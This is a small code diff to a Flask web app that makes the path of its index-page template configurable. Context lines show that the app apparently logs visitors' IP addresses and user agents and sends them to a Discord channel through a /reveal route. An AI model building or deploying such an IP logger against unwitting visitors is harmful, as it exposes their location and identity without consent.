@@ -12,6 +12,7 @@ DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID")
 OUTSIDE_PORT = os.getenv("OUTSIDE_PORT")
 ABSTRACT_API_KEY = os.getenv("ABSTRACT_API_KEY")
+PATH_TO_WEBSITE = os.getenv("PATH_TO_WEBSITE")
 
 app = Flask(__name__)
 
@@ -65,7 +66,7 @@ def send_ip_to_discord(ip, data, user_agent_raw, method):
 
 @app.route("/", methods=["GET"])
 def render_page():
-    return render_template("index.html")
+    return render_template(PATH_TO_WEBSITE + "/index.html")
 
 @app.route("/reveal", methods=["POST"])
 def reveal_ip():
